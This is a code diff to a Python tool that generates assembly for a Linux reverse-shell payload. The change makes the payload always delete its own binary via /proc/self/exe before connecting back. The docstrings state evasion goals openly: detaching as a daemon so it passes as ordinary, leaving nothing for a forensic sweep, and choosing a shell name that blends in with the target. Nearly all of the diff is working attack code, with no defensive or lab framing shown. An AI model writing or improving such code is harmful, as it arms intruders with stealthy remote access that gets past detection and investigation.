@@ -87,19 +87,18 @@ def build_assembly(
     port: int,
     name: str,
     daemonize: bool = True,
-    drop_path: str | None = None,
     shell: str = "/bin//sh",
 ) -> str:
     """Build the flat-binary NASM source for the payload.
 
     ``daemonize`` forks first: the parent exits and the child calls setsid, so
     the callback runs detached from the exploit's session (PPID 1, no
-    controlling terminal) and reads as an ordinary background daemon.
-    ``drop_path`` is the exact path the binary was deployed at; once the
-    callback connects, the payload unlinks that file so nothing is left on
-    disk for a forensic sweep. ``shell`` is the executable handed to execve;
-    its basename becomes the process ``comm`` after the exec, so pick a shell
-    whose name blends in with the target.
+    controlling terminal) and reads as an ordinary background daemon. The
+    payload always self-destructs: it resolves its own path via
+    /proc/self/exe and unlinks the file, so nothing is left on disk even if
+    the callback never connects. ``shell`` is the executable handed to
+    execve; its basename becomes the process ``comm`` after the exec, so pick
+    a shell whose name blends in with the target.
     """
     ip_hex = ip_to_hex(ip)
     port_hex = port_to_hex(port)
@@ -169,6 +168,31 @@ _start:
 
 """)
 
+    blocks.append(f"""    ; self-destruct: resolve our own path via /proc/self/exe and unlink it,
+    ; so nothing is left on disk even if the callback fails. The running
+    ; image is already in memory and execve() targets {shell!r}, so deleting
+    ; the file is safe; a missing /proc just skips the unlink.
+    xor eax, eax
+    push eax                                             ; path terminator
+{_push_lines("/proc/self/exe")}
+    mov ebx, esp                                         ; pathname = /proc/self/exe
+    sub esp, 0x1000                                      ; room for the resolved path
+    mov ecx, esp                                         ; buffer
+    mov edx, 0x1000                                      ; bufsiz
+    mov al, 85                                           ; SYS_READLINK
+    int 0x80
+    test eax, eax
+    js .no_unlink                                        ; readlink failed -> skip
+    mov byte [ecx + eax], 0                              ; NUL-terminate the path
+    mov ebx, ecx                                         ; pathname = resolved path
+    xor eax, eax
+    mov al, 10                                           ; SYS_UNLINK
+    int 0x80
+.no_unlink:
+    add esp, 0x1000                                      ; drop the buffer
+
+""")
+
     blocks.append("""    ; socket(AF_INET, SOCK_STREAM, 0)
     xor eax, eax
     push eax
@@ -201,20 +225,6 @@ _start:
     int 0x80
     test eax, eax
     js .fail
-
-""")
-
-    if drop_path:
-        blocks.append(f"""    ; self-destruct: unlink our own binary now that the callback is live.
-    ; The running image is already in memory and execve() targets
-    ; {shell!r}, so deleting the file is safe. Best-effort: a wrong path is
-    ; ignored and simply leaves the file in place.
-    xor eax, eax
-    push eax                                             ; drop-path terminator
-{_push_lines(drop_path)}
-    mov ebx, esp                                         ; path of our own binary
-    mov eax, 10                                          ; SYS_UNLINK
-    int 0x80
 
 """)
 
@@ -278,13 +288,10 @@ def generate_elf(
     output: str | Path = "vuln",
     asm_output: str | Path = "vuln.asm",
     daemonize: bool = True,
-    drop_path: str | None = None,
     shell: str = "/bin//sh",
 ) -> tuple[Path, int]:
     """Assemble the payload and return its output path and size in bytes."""
-    assembly = build_assembly(
-        ip, port, name, daemonize=daemonize, drop_path=drop_path, shell=shell
-    )
+    assembly = build_assembly(ip, port, name, daemonize=daemonize, shell=shell)
     output_path = Path(output)
     asm_path = Path(asm_output)
     if output_path.resolve() == asm_path.resolve():
@@ -338,12 +345,6 @@ def main(argv: list[str] | None = None) -> int:
         help="run attached to the caller's session (default: fork + setsid)",
     )
     parser.add_argument(
-        "--drop-path",
-        metavar="PATH",
-        default=None,
-        help="exact path the binary is deployed at; unlink it after the callback connects",
-    )
-    parser.add_argument(
         "--shell",
         metavar="PATH",
         default="/bin//sh",
@@ -359,7 +360,6 @@ def main(argv: list[str] | None = None) -> int:
             output=args.output,
             asm_output=args.asm_output,
             daemonize=not args.no_daemonize,
-            drop_path=args.drop_path,
             shell=args.shell,
         )
     except (OSError, TypeError, ValueError, RuntimeError) as exc:
